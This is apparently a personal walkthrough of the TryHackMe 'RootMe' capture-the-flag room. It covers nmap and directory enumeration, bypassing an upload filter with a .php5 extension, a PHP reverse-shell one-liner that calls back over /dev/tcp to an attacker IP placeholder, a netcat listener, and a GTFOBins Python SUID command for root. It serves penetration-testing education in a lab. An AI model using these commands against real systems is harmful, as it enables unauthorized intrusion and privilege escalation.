
# RootMe CTF Walkthrough – TryHackMe

## 🕵️ About the Room

The **RootMe CTF** on TryHackMe is an engaging challenge designed to teach beginners and intermediate users how to exploit common vulnerabilities in web applications and escalate privileges on Linux systems. It focuses on enumeration, file upload vulnerabilities, and privilege escalation techniques that mirror real-world penetration testing scenarios.

Throughout this room, I learned how to:
✔ Perform network scanning and service enumeration  
✔ Identify vulnerable web directories through directory busting  
✔ Exploit file upload restrictions by bypassing file extension filters  
✔ Use reverse shells to gain remote access  
✔ Enumerate files and permissions to find privilege escalation paths  
✔ Exploit SUID binaries using tools like gtfobins for privilege escalation  

This walkthrough documents the step-by-step process I followed to compromise the machine and retrieve both user and root flags.

---

## ✅ Steps Taken to Solve the RootMe CTF

### 1️⃣ Connecting to TryHackMe Network

The first step was to establish a connection with the TryHackMe environment using the OpenVPN configuration file:

\`\`\`bash
$ sudo openvpn Downloads/Ynos.ovpn
\`\`\`

This ensured secure access to the lab network.

---

### 2️⃣ Verifying Connectivity

Once connected, I confirmed that I could communicate with the target machine by sending ICMP packets using the ping command:

\`\`\`bash
$ ping (Ip of the machine)
\`\`\`

This verified that the target system was online and reachable.

---

### 3️⃣ Running Nmap Scan for Enumeration

I then began scanning the target machine to identify open ports and services using this command:

\`\`\`bash
$ nmap -sV -O -T5 -p- 10.10.109.68 -oN Nmap.results
\`\`\`

This scan identified:
- All ports (\`-p-\`)
- Service versions (\`-sV\`)
- Operating system details (\`-O\`)
- Aggressive timing template for speed (\`-T5\`)
- Output written to \`Nmap.results\`

---

### 4️⃣ Starting Directory Busting (Dirbusting)

While the Nmap scan was running, I began directory busting on the web server using a tool like `dirb` or `gobuster`. This revealed several directories and potential entry points:

```text
/css/  -> Contains upload functionality
```

This early enumeration set the stage for further exploitation.

---

### 5️⃣ Reviewing Open Ports

The Nmap scan results showed that **two ports were open**:
- SSH service for remote login
- Apache web server serving content

These services provided the main attack vectors.

---

### 6️⃣ Finding Upload Functionality in the Web Directory

The directory busting process uncovered that the `/css/` directory contained a file called `panel`, which could be used for uploading files to the server:

```text
/css/panel
```

This was a significant discovery because file uploads are often misconfigured and lead to remote code execution vulnerabilities.

---

### 7️⃣ Uploading a Reverse Shell

Knowing that the Apache server was running PHP, I used a PHP reverse shell from Pentest Monkey's repository to exploit the upload feature. This shell allows the attacker to connect back to the target machine:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'"); ?>
```

However, I discovered that uploading `.php` files was blocked by the server.

---

### 8️⃣ Bypassing File Upload Restrictions

To bypass the restriction, I renamed the file extension from `.php` to `.php5`, which is often parsed by PHP servers. This allowed me to upload the shell script successfully without being blocked by the file extension filter.

---

### 9️⃣ Setting Up a Listener for the Reverse Shell

On my attacking machine, I set up a netcat listener to catch the incoming connection once the uploaded file was triggered:

\`\`\`bash
$ nc -nvlp 4444
\`\`\`

After refreshing the web page that triggered the shell, I gained access to the target system.

---

### 🔟 Finding the User Flag

With initial access, the next goal was to locate the `user.txt` flag file, typically found in the home directory of the user with limited permissions.

---

### 1️⃣1️⃣ Enumerating for Privilege Escalation Paths

To prepare for privilege escalation, I searched for files with SUID permissions that could be exploited:

\`\`\`bash
$ find / -perm -4000 -type f 2>/dev/null
\`\`\`

This identified binaries that could be misused to escalate privileges.

---

### 1️⃣2️⃣ Exploiting Python for Privilege Escalation

The enumeration revealed that `/usr/bin/python` had elevated permissions. Using this information, I referred to **gtfobins**, a curated list of binaries that can be exploited for privilege escalation.

The exploit command was:

\`\`\`bash
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
\`\`\`

Running this command gave me an elevated shell with administrative privileges.

---

### 1️⃣3️⃣ Confirming Admin Access

After executing the exploit, I verified that I had root privileges by checking the current user or accessing restricted directories.

---

### 1️⃣4️⃣ Capturing the Root Flag

Finally, with full administrative access, I navigated to the root directory and retrieved the `root.txt` file:

```text
/root/root.txt
```

This marked the completion of the challenge.

---

## ✅ What I Learned

- How to connect securely to a lab environment using OpenVPN  
- How to verify connectivity using ping  
- How to scan a system using Nmap for open ports and services  
- How to perform directory busting to find hidden paths  
- How to exploit file upload functionality in web servers  
- How to bypass file extension restrictions to upload malicious scripts  
- How to use netcat as a listener for reverse shells  
- How to enumerate for SUID binaries to find privilege escalation paths  
- How to exploit Python’s permissions for administrative access using gtfobins  
- How to retrieve sensitive information like user and root flags  

---

## 📂 Conclusion

The **RootMe CTF** was a highly instructive challenge that covered multiple stages of exploitation, from enumeration to privilege escalation. It reinforced key penetration testing techniques while demonstrating how misconfigurations and improper input validation can lead to full system compromise.

This walkthrough reflects my hands-on experience and aims to help others understand how attackers approach web application vulnerabilities and system exploitation.

Happy hacking! 🚀🔐

